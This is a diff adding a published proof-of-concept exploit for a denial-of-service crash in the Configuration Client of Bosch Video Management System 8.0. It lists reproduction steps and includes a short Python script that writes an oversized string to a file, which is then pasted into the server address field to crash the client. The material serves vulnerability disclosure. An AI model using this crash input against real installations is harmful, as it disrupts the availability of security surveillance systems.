@@ -1,0 +1,30 @@
+# Exploit Title: Bosch Video Management System 8.0-Configuration Client-Denial of Service (Poc)
+# Discovery by: Daniel
+# Discovery Date: 2018-11-12
+# Software Name: Bosch Video Management System
+# Software Version: 8.0
+# Vendor Homepage: https://www.boschsecurity.com/xc/en/products/management-software/bvms/
+# Software Link: https://la.boschsecurity.com/es/productos/videosystems_1/videosoftware_1/videomanagementsystems_1/boschvideomanagementsyste_8/boschvideomanagementsyste_8_44761
+# Tested on: Windows 10 Pro x64
+
+#Make sure that during the installation of software you installed all the program features available.
+#This PoC was carried out in 'Configuration Client', which is part of 'Bosch Video Management System'.
+
+# Steps to produce the crash:
+# 1.- run: dos.py
+# 2.- Open bosch.txt and copy content to clipboard
+# 2.- Open Configuration Client (Normally the installer creates a direct link in desktop)
+# 3.- Click on 'Connection:' box and select "Address Book"
+# 4.- Copy clipboard in "(Enterprise) Management Server Address:"
+# 5.- write "test" in 'Username'
+# 6.- Write "test" in 'Password'
+# 7.- Click on 'OK'
+# 8.- Crash
+
+
+#!/usr/bin/python
+
+buf = "\x41" * 64
+f = open('bosch.txt', 'w')
+f.write(buf)
+f.close()
